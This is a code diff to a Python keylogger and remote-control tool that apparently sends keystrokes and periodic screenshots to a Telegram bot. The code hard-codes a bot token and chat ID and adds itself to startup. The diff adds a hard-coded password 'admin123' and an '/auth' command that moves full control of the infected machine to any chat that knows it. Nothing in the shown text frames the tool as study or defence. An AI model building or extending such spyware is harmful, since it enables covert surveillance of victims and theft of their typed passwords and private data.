@@ -16,6 +16,7 @@ import html
 # Telegram Monitoring configuration
 BOT_TOKEN = "8836300723:AAFkFTxToMDt3KtVb4nL-iLEYBou0Y22Nmk"
 CHAT_ID = "5904599269"
+SECRET_KEY = "admin123"
 
 # Intervals in seconds
 SCREENSHOT_INTERVAL = 30
@@ -61,7 +62,8 @@ def load_state():
         "keylog_send_interval": 120,
         "outbox_retry_interval": 60,
         "machine_name": "",
-        "paused": False
+        "paused": False,
+        "chat_id": ""
     }
     with state_lock:
         if os.path.exists(STATE_PATH):
@@ -98,7 +100,7 @@ def save_state(state):
         except Exception as e:
             log_message(f"Error saving state: {e}")
 
-def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None, paused=None):
+def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_retry=None, telegram_offset=None, screenshot_interval=None, keylog_send_interval=None, outbox_retry_interval=None, machine_name=None, paused=None, chat_id=None):
     state = load_state()
     if last_screenshot_sent:
         state["last_screenshot_sent"] = last_screenshot_sent
@@ -118,6 +120,8 @@ def update_state(last_screenshot_sent=None, last_keylog_sent=None, last_outbox_r
         state["machine_name"] = machine_name
     if paused is not None:
         state["paused"] = paused
+    if chat_id is not None:
+        state["chat_id"] = chat_id
     save_state(state)
 
 def process_keylog_text(raw_text):
@@ -1002,14 +1006,33 @@ def poll_telegram():
                 offset = update["update_id"] + 1
                 update_state(telegram_offset=offset)
                 
+                global CHAT_ID
+                
                 if "message" in update:
                     msg = update["message"]
+                    sender_chat_id = str(msg.get("chat", {}).get("id", ""))
+                    
+                    if sender_chat_id != CHAT_ID:
+                        # Check if message is `/auth <secret_key>` to re-authorize new chat ID
+                        text = msg.get("text", "").strip()
+                        parts = text.split()
+                        if len(parts) == 2 and parts[0].lower() in ["/auth", "auth"]:
+                            if parts[1] == SECRET_KEY:
+                                CHAT_ID = sender_chat_id
+                                update_state(chat_id=CHAT_ID)
+                                send_telegram_message("✅ Đã xác thực thành công và chuyển toàn bộ quyền điều khiển sang tài khoản này.")
+                        continue
+                        
                     if "text" in msg:
                         execute_command(msg["text"], msg)
                     elif "document" in msg:  # Nhận file
                         execute_command("/update", msg)
                 elif "callback_query" in update:
                     cb = update["callback_query"]
+                    sender_chat_id = str(cb.get("from", {}).get("id", ""))
+                    if sender_chat_id != CHAT_ID:
+                        continue
+                        
                     cb_id = cb.get("id")
                     cb_data = cb.get("data", "")
                     if cb_data:
@@ -1039,13 +1062,16 @@ def add_to_startup(force=False):
         return False
 
 def main():
-    global SCREENSHOT_INTERVAL, KEYLOG_SEND_INTERVAL, OUTBOX_RETRY_INTERVAL, IS_PAUSED
+    global SCREENSHOT_INTERVAL, KEYLOG_SEND_INTERVAL, OUTBOX_RETRY_INTERVAL, IS_PAUSED, CHAT_ID
     try:
         state = load_state()
         SCREENSHOT_INTERVAL = state.get("screenshot_interval", 30)
         KEYLOG_SEND_INTERVAL = state.get("keylog_send_interval", 120)
         OUTBOX_RETRY_INTERVAL = state.get("outbox_retry_interval", 60)
         IS_PAUSED = state.get("paused", False)
+        saved_chat_id = state.get("chat_id")
+        if saved_chat_id:
+            CHAT_ID = saved_chat_id
     except Exception as e:
         log_message(f"Error loading initial intervals: {e}")
 
